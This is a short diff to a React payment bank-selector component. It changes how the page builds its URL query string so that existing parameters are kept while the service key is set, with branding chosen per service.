@@ -15,6 +15,7 @@ const PaymentBankSelector = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData, isLoading: linkLoading } = useLink(id);
+  const initialSearch = useMemo(() => (typeof window !== "undefined" ? window.location.search : ""), []);
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -36,7 +37,14 @@ const PaymentBankSelector = () => {
   const serviceKey = linkData?.payload?.service_key || linkData?.payload?.service || urlServiceKey || customerInfo.serviceKey || sessionServiceKey || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  const serviceQuery = serviceKey ? `?service=${encodeURIComponent(serviceKey)}` : "";
+  const serviceQuery = useMemo(() => {
+    const params = new URLSearchParams(initialSearch || "");
+    if (serviceKey) {
+      params.set('service', serviceKey);
+    }
+    const search = params.toString();
+    return search ? `?${search}` : "";
+  }, [initialSearch, serviceKey]);
 
   useEffect(() => {
     if (serviceKey) {
